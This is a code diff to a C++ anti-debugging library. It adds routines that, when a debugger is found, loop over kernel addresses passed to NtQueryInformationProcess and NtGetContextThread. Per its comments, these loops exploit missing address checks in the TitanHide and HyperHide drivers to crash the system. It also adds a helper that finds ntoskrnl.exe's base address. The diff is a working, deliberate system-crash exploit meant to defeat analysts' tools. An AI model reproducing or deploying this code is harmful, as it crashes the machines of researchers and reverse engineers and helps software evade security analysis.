@@ -3,19 +3,21 @@
 #define ANTI_DEBUG_TOOL 1
 
 #define BSOD_TITAN_HIDE 1 
-
+#define BSOD_HYPER_HIDE 1 
 #include "lazy_importer.h"
 #include "NtApiDef.h"  
 #include <iostream>
 
-#ifdef BSOD_TITAN_HIDE
-#define BSOD_DO(handle) \
-        for (auto i = 0xFFFFF80000000000; i < 0xFFFFFFFF00000000; i += 0x1000)  \
-            nt_status = LI_FN(NtQueryInformationProcess).nt_cached()(handle, ProcessDebugObjectHandle, reinterpret_cast<PVOID>(i), lenght, NULL);
-#else
-#define BSOD_DO(handle) 
-#endif // BSOD_TITAN_HIDE
 
+//Read this https://www.unknowncheats.me/forum/anti-cheat-bypass/314342-read-unknown-kernel-address-safe.html
+#ifdef BSOD_TITAN_HIDE
+#define BSOD_DO_TITAN_HIDE(handle) \
+        for (auto i = 0xFFFFF80000000000; i < 0xFFFFFFFF00000000; i += 0x1000)  \
+            LI_FN(NtQueryInformationProcess).nt_cached()(handle, ProcessDebugObjectHandle, reinterpret_cast<PVOID>(i), lenght, NULL);
+#else
+#define BSOD_DO_TITAN_HIDE(handle) 
+#endif // BSOD_TITAN_HIDE
+ 
 /*
 Русские не сдаются!!!
  https://github.com/x64dbg/ScyllaHide/blob/a0e5b8f2b1d90be65022545d25288f389368a94d/HookLibrary/HookHelper.cpp#L380
@@ -71,6 +73,7 @@ namespace bad_code_detector
             VirtualFree(buffer, 0, MEM_RELEASE);
             return handle_number;
         }
+        
         __forceinline auto strlen(const char* string) -> INT
         {
             INT cnt = 0;
@@ -87,6 +90,22 @@ namespace bad_code_detector
             if (c >= L'À' && c <= L'ß') return c - L'À' + L'à';
             if (c == L'¨') return L'¸';
             return c;
+        }
+
+        __forceinline int stricmp(const CHAR* cs, const CHAR* ct)
+        {
+            if (cs && ct)
+            {
+                while (tolower(*cs) == tolower(*ct))
+                {
+                    if (*cs == 0 && *ct == 0) return 0;
+                    if (*cs == 0 || *ct == 0) break;
+                    cs++;
+                    ct++;
+                }
+                return tolower(*cs) - tolower(*ct);
+            }
+            return -1;
         }
 
         __forceinline auto wstricmp(const WCHAR* cs, const WCHAR* ct) -> INT
@@ -135,7 +154,54 @@ namespace bad_code_detector
             }
             return NULL;
         }
-    }
+    
+        __declspec(noinline) auto get_address_driver(const CHAR* module_name) -> uint64_t 
+        {
+            PVOID buffer = NULL;
+            DWORD ret_lenght = NULL;
+            NTSTATUS nt_status = STATUS_UNSUCCESSFUL;
+            uint64_t base_address = NULL;
+            PRTL_PROCESS_MODULES module_info;
+
+            nt_status = LI_FN(NtQuerySystemInformation).nt_cached()(SystemModuleInformation, buffer, ret_lenght, &ret_lenght);
+
+            while (nt_status == STATUS_INFO_LENGTH_MISMATCH)
+            {
+                if (buffer != NULL)
+                    VirtualFree(buffer, 0, MEM_RELEASE);
+
+                buffer = VirtualAlloc(nullptr, ret_lenght, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                nt_status = LI_FN(NtQuerySystemInformation).nt_cached()(SystemModuleInformation, buffer, ret_lenght, &ret_lenght);
+            }
+
+            if (!NT_SUCCESS(nt_status))
+            {
+                if (buffer != NULL)
+                    VirtualFree(buffer, 0, MEM_RELEASE);
+                return NULL;
+            }
+
+            module_info = static_cast<PRTL_PROCESS_MODULES>(buffer);
+            if (!module_info)
+                return NULL;
+
+            for (auto i = 0u; i < module_info->NumberOfModules; ++i)
+            {
+
+                if (stricmp(reinterpret_cast<char*>(module_info->Modules[i].FullPathName) + module_info->Modules[i].OffsetToFileName, module_name) == NULL)
+                {
+                    base_address = reinterpret_cast<uint64_t>(module_info->Modules[i].ImageBase);
+                    VirtualFree(buffer, 0, MEM_RELEASE);
+                    return base_address;
+                }
+            }
+
+            VirtualFree(buffer, 0, MEM_RELEASE);
+            return NULL;
+        }
+
+
+}
 
     __declspec(noinline) void mem_function()
     {
@@ -151,6 +217,7 @@ namespace bad_code_detector
         auto mem_address = reinterpret_cast<uint64_t>(&mem_function);
         CONTEXT ctx = { 0 };
         CONTEXT ctx2 = { 0 };
+       
         ctx.Dr0 = mem_address;
         ctx.Dr7 = 1;
         ctx.ContextFlags = 0x10;
@@ -173,7 +240,26 @@ namespace bad_code_detector
             ctx2.Dr3 ||
             !ctx2.Dr7)
             return TRUE;
-     
+         
+#ifdef BSOD_HYPER_HIDE
+        /*
+        https://github.com/Air14/HyperHide/blob/11d9ebc7ce5e039e890820f8712e3c678f800370/HyperHideDrv/HookedFunctions.cpp#L874
+        No check UM address? 
+        */
+        uint64_t kernel_address = bad_code_detector::util::get_address_driver("ntoskrnl.exe");
+
+        if (kernel_address == NULL)
+            kernel_address = 0xFFFFF80000000000;
+
+        for (size_t i = NULL,sucess_number = NULL; sucess_number == NULL && i < 0x100 * 0x100; kernel_address += 0x1000, i++)
+        {
+            auto nt_status =  LI_FN(NtGetContextThread).nt_cached()(NtCurrentThread, reinterpret_cast<PCONTEXT>(kernel_address));
+            if (STATUS_ACCESS_VIOLATION != nt_status)
+                sucess_number++;
+        } 
+#endif // BSOD_HYPER_HIDE
+             
+
         ctx2.Dr0 = 0;
         ctx2.Dr7 = 0;
         ctx2.ContextFlags = CONTEXT_DEBUG_REGISTERS;
@@ -378,7 +464,7 @@ namespace bad_code_detector
         nt_status = LI_FN(NtQueryInformationProcess).nt_cached()(NtCurrentProcess, ProcessDebugObjectHandle, &debug_object, lenght, reinterpret_cast<PULONG>(0x1));
         if (debug_object != reinterpret_cast<HANDLE>(1) || NT_SUCCESS(nt_status))
         {
-            BSOD_DO(NtCurrentProcess);
+            BSOD_DO_TITAN_HIDE(NtCurrentProcess);
             return TRUE;
         }
  
@@ -386,7 +472,7 @@ namespace bad_code_detector
         nt_status = LI_FN(NtQueryInformationProcess).nt_cached()(NULL, ProcessDebugObjectHandle, reinterpret_cast<PVOID>(1), lenght, reinterpret_cast<PULONG>(0x1));
         if (nt_status != STATUS_ACCESS_VIOLATION &&  nt_status != STATUS_DATATYPE_MISALIGNMENT)
         {
-            BSOD_DO(NtCurrentProcess);
+            BSOD_DO_TITAN_HIDE(NtCurrentProcess);
             return TRUE;
         }
 		
@@ -404,7 +490,7 @@ namespace bad_code_detector
             if (debug_object != reinterpret_cast<HANDLE>(1) || NT_SUCCESS(nt_status))
             {
                 BREAK_INFO();
-                BSOD_DO(bug_handle);
+                BSOD_DO_TITAN_HIDE(bug_handle);
                 RESTORE_INFO();
                 LI_FN(NtClose).nt_cached()(bug_handle);
                 return TRUE;
